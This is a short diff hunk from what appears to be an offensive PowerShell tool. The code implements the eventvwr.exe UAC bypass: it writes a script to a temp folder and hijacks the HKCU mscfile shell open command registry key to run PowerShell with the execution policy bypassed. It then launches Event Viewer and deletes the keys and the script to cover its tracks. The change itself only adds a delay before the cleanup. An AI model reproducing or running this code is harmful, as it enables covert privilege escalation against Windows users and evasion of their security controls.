@@ -149,7 +149,7 @@ $ruta = $env:USERPROFILE + "\appdata\local\temp\1\temp.ps1" ; $comando  | Out-Fi
 New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command | Out-Null 
 $key = "registry::HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command" ; $modifica = "c:\Windows\system32\WindowsPowerShell\v1.0\powershell -executionpolicy bypass -file $ruta" ; set-item $Key $modifica
 sleep -Seconds 3 ; Start-Process eventvwr.exe ; sleep -Seconds 3
-Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\ ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile ; Remove-Item $ruta }
+Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\ ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile ; sleep -Seconds 10; Remove-Item $ruta }
 
 
 function whoami_me {
